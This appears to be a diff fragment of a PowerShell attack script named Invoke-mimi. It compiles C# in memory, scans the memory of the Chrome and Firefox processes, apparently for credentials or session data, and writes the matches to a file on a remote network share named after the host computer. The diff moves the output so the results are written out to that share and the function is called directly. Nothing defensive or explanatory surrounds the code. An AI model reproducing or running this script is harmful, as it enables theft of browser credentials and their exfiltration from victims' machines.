@@ -440,7 +440,10 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 
 $matchesFound=[mimi.MemProcInspector]::InspectManyProcs("chrome","firefox")
 
-write-output $matchesFound
-}
+
 $FileName = $env:computername + "_" + [DateTime]::Now.ToString("yyyyMMdd-HHmmss") + ".txt"
-Invoke-mimi  >> \\DESKTOP-V23VH90\Temp\$FileName
+
+write-output $matchesFound 
+write-output $matchesFound >> \\DESKTOP-V23VH90\Temp\$FileName
+}
+Invoke-mimi  
